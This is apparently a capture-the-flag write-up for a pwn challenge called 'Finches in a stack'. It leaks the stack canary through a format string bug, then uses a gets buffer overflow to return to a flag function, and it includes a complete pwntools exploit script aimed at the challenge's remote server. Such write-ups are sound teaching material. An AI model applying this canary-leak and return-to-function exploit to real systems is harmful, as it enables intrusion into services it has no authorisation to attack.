# Finches in a stack

Let's run a checksec. Canary, no PIE.

On our first input, there's a format string vuln.

On the second input, there's a buffer overflow as gets is used.

There is also a flag function that seems to call system\("cat flag.txt"\). We just need to return to this function. There's a canary, so this isn't so easy.

We can, however, use our format string vulnerability to leak the canary value, as the canary is stored on the stack and format strings let us leak values stored on the stack. I used a simple fuzzing script to find the canary offset, which was 11. We can set a breakpoint at the instruction which checks the canary and paste in a cyclic pattern to get the offset to the canary, which is 24 by checking the loaded canary value from the stack against the pattern. Our payload will be:

junk + canary + 12 bytes of junk + address of flag function

```python
from pwn import *
import re
e = ELF("./fias")
#p = e.process()
p = remote('95.216.233.106',64832)
p.clean()
p.sendline("%11$p")
output = p.recvline().decode()
print(output)
leak = int(re.findall("Nice to meet you, (.*)!", output)[0], 16)
canary = leak
log.info(f"Canary: {hex(canary)}")
padding = b'A' * 25
payload = flat(padding, canary, b'A' * 12, e.symbols['flag'])
p.sendline(payload)
p.interactive()
```

